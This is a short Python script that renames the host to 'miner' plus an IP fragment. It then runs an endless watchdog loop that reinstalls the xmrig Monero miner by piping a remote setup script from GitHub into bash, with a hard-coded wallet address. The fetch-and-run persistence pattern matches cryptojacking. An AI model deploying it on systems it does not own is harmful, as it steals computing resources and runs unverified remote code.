import subprocess
import os
from time import sleep



p = subprocess.Popen("hostname -I", stdout=subprocess.PIPE, shell=True)
(output1, err) = p.communicate()
output1=str(output1)
name= output1.split(".")[3]
name=name[0:3]
print("hostnamectl set-hostname miner"+name)
os.system("hostnamectl set-hostname miner"+name)

while True:
    sleep(10)
    p = subprocess.Popen("ps -A", stdout=subprocess.PIPE, shell=True)
    (output, err) = p.communicate()
    output=str(output)
    if len(output.split("xmrig"))<=1:
        os.system("curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 42Xk3DR9p73PGrKfNC7NGzeWRwJMqXovuDTtKHss8XWJAKHPJ1ZV779E26qGi3mukeD9emegL1QpZJ7B2nYJPKMvK1UxWMe")
